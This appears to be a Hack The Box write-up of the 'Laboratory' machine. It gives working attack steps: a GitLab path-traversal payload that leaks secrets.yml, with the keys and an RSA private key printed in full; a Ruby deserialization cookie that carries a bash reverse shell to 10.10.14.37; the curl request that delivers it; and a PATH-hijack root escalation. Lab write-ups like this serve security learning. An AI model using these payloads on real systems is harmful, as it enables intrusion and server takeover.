---
layout: single
title: Laboratory - Hack The Box
excerpt: Laboratory is mainly about exploiting a running gitlab instance. The privesc is exploiting a binary that doesn't address a binary by its full path. 
date: 2021-04-18
classes: wide
header:
  teaser: /assets/images/htb-writeup-laboratory/laboratory_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - custom exploitation
  - gitlab
---

![](/assets/images/htb-writeup-laboratory/laboratory_logo.png)

Laboratory is rather an interesting box that is about exploiting a gitlab instance vulnerable with an LFI which can be used to leak a secret that can be used to craft an authenticated RCE payload. 


<h1>Laboratory</h1>
<h3>Difficulty: easy, rating: 7/10</h3>


<h4> Initial foothold </h4>


let's begin with our nmap
```
# Nmap 7.80 scan initiated Sun Nov 15 11:31:30 2020 as: nmap -sV -sC -oN nmap/init 10.10.10.216
Nmap scan report for 10.10.10.216
Host is up (0.095s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 15 11:31:55 2020 -- 1 IP address (1 host up) scanned in 24.97 seconds
```
We have an ssh server, and HTTP/HTTPs ports open. We also notice something very eye-catching
```
| Subject Alternative Name: DNS:git.laboratory.htb
```
let's add laboratory.htb / git.laboratory.htb to our /etc/hosts

```
# Laboratory box
10.10.10.215 laboratory.htb
10.10.10.215 git.laboratory.htb
```
If you take a keen look at the box logo/art, We notice rick (from Rick & Morty) holding a flask that is similiar to gitlab logo. So I'll take that hint and only focus on the gitlab server for time being

let's take a look at git.laboratory.htb, we can see there is one public repoisteries called "SecureWebsite" by user "Dexter" which has one issue done by "Seven". We'll take those two as potenial users on
the box and save them in our user.txt

```
-> user.txt
dexter
seven
```
by going to the question mark on the top-right, and then help, we get a webpage saying "Gitlab Community edition 12.8.1". If we do a few google searches an article from hackerone comes up and reports a 
vulnerability with arbitrary read on the server. we can exploit it to read some sensitive files on the server.
- we first go and sign up
- then we login, make two projects: ProjectA and ProjectB
- then we simply make and issue by going to issues ->  New issue
 
**payload**:
```
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml) 
``` 
result:
```
# This file is managed by gitlab-ctl. Manual changes will be
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.

---
production:
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af
  openid_connect_signing_key: |
    -----BEGIN RSA PRIVATE KEY-----
    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
    -----END RSA PRIVATE KEY-----
```

which will return the server secret. We are now supposed to make install gitlab on our vm. I'll not go into installation details but in general 
I'd advise against installing gitlab in your Kali VM as gitlab per se is a heavy software that you don't want to carry around. Make a separate
VM with Ubuntu/Debian preferably and install version `12.8.7-ee.ee0` as it worked for me (the same in hackerone report)

- we install a fresh ubuntu with gitlab on it (version 12.8.7-ee.ee0) 
- replace Ubuntu VM /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
with the box secret
- make a payload file

its contents are 
```ruby
request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= ``bash -c 'bash -i >& /dev/tcp/10.10.14.37/1234 0>&1' %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
```
we simply now just call the console and let it generate our payload
```bash
sudo gitlab-rails console < payload
....
BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidSNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM3LzEyMzQgMD4mMSdgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--310d76bec1d6e20b19a761c77cd57ec41dad72c3
```
now we use the payload respectively to spawn the shell, by opening a netcat listener & sending the request with the payload as a cookie
```bash
nc -lnvp 1234
```
we send the request now
```bash
payload='BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidSNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjM3LzEyMzQgMD4mMSdgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--310d76bec1d6e20b19a761c77cd57ec41dad72c3'
curl http://git.laboratory.htb/users/sign_in -b "experimentation_subject_id=$payload" -k 
```
which opens up a shell as a `git` user.

<h4> User </h4>


from initial enumeration on the website we know a user named "dexter" in gitlab exists and he has a repo as well, so we'll try to just dexter password to login as him
we simply open up gitlab-rails console and enter the following commands
```ruby
user = User.where(id: 1).first
user.password = "cyber_demon"
user.password_confirmation = 'cyber_demon'
user.save!
```
which will save the password for dexter user to "cyber_demon", 
now we navigate to the webpage and login as dexter.
we notice a private repo; let's check it out, if we check its files we find authorized_hosts / id_rsa. I'll just assume it belongs to dexter. we grab the key and ssh to the server as dexter

```bash
ssh -i id_rsa dexter@laboratory.htb
```

which lands us a shell as dexter, and we find the user.txt as well.

<h4> priviledge escalation </h4>


Pirviledge escalation was easy as it gets, there's  a setuid executable that executes "chmod" without specifing a direct path to it. 


<h5> Enumeration </h5>:

```bash
find / -perm -4000 -type f 2>/dev/null
/usr/local/bin/docker-security
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/at
/usr/bin/umount
/usr/bin/chsh
/usr/bin/mount
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
```


we notice docker-security is out of order and it's unfamiliar, let's run `ltrace` on it
```bash
ltrace /usr/local/bin/docker-security 
setuid(0)                                                                                                                                        = -1
setgid(0)                                                                                                                                        = -1
system("chmod 700 /usr/bin/docker"chmod: changing permissions of '/usr/bin/docker': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                           = 256
system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/docker.sock': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                           = 256
+++ exited (status 0) +++
```
we notice it's sending system call on chmod file to set `/var/run/docker.sock` to 660 for security reasons (presumably). The problem is that the binary doesn't call chmod from a direct path, 
like `/bin/chmod arg0 arg1...`. We'll exploit this by setting our path and making our local chmod to launch bash for us as root.

```bash
export PATH=/home/dexter:$PATH;
echo -e "#\!/usr/bin/env bash\nbash" > /home/dexter/chmod
chmod 700 /home/dexter/chmod
docker-security
```
which will launch root shell :)

